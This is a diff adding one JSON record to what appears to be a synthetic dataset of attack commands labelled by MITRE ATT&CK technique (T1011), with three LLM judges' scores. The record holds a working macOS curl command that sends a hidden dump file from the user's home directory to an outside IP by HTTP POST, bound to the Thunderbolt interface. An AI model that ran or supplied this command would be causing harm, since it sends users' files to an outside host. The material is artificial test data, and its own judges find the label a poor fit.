@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
+  "explanation": "Uses the Thunderbolt Bridge interface for HTTP POST exfiltration by explicitly binding curl to that alternate medium (T1011).",
+  "rationale_steps": [
+    "Fetch Thunderbolt Bridge IP with networksetup",
+    "Bind curl to the Thunderbolt interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f3051136",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Properly quoted and parseable with valid curl flags and a correct command substitution.",
+        "semantic_score": 2,
+        "semantic_justification": "While it binds curl to the Thunderbolt Bridge interface and posts a file, this is still network exfiltration rather than exfiltration via a removable physical medium as described, and it may fail if that interface lacks a valid IP.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T09:09:02.346256Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid curl flags, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 by using the Thunderbolt Bridge interface (a physical medium) for exfiltration, though it uses HTTP rather than direct physical medium transfer which slightly reduces technique alignment.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:09:05.269924Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, and correct command substitution and piping for its components.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs network exfiltration via HTTP POST, which does not align with the T1011 technique of physically removing data on a removable medium.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:09:15.477418Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
